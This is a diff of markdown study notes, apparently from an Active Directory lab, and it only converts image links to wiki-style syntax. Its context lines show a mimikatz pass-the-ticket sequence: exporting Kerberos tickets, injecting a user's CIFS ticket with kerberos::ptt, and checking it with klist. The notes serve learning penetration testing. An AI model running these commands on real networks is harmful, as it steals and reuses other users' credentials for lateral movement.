@@ -23,17 +23,17 @@ sekurlsa::tickets /export
 ```powershell
 dir *.kirbi
 ```
-![](../../../assets/images/Pasted%20image%2020260502093210.png)
+![[Pasted image 20260502093210.png]]
 
 ```mimikatz
 kerberos::ptt [0;264a32]-0-0-40810000-dave@cifs-web04.kirbi
 ```
-![](../../../assets/images/Pasted%20image%2020260502093630.png)
+![[Pasted image 20260502093630.png]]
 
 ```powershell
 klist
 ```
-![](11_Active_Directory/03_横展開/assets/images/Pasted%20image%2020250819232715.png)
+![[Pasted image 20250819232715.png]]
 - Client: dave @ CORP.COM
  - Server: cifs/web04 @ CORP.COM
 ```poershell
